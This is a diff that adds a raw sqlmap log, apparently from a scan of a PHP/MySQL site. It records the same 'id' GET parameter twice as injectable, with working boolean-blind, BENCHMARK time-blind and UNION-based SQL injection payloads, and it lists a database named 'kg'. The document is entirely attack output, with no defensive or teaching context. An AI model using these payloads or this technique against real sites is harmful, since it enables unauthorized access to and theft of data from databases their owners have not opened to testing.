@@ -1,0 +1,40 @@
+sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1033=1033
+
+    Type: AND/OR time-based blind
+    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
+    Payload: id=1 AND 7885=BENCHMARK(5000000,MD5(0x755a645a))
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=-6033 UNION ALL SELECT CONCAT(0x71627a7171,0x6a65574a73757678534a436a44556379575a56797846564e62574d54634d4e736474506542635249,0x71717a7171),NULL-- faGT
+---
+web application technology: PHP 5.6.9
+back-end DBMS: MySQL <= 5.0.11
+available databases [1]:
+[*] kg
+
+sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3754=3754&rct=j&q=&esrc=s
+
+    Type: AND/OR time-based blind
+    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
+    Payload: id=1 AND 3016=BENCHMARK(5000000,MD5(0x56535953))&rct=j&q=&esrc=s
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=-9921 UNION ALL SELECT CONCAT(0x7171716271,0x4d5748686a4b784b6d63794157655553514b7942426f5554504d696f51477a4f715468504c756870,0x71716a7a71),NULL-- Gukv&rct=j&q=&esrc=s
+---
+web application technology: PHP 5.6.9
+back-end DBMS: MySQL <= 5.0.11
+available databases [1]:
+[*] kg
+
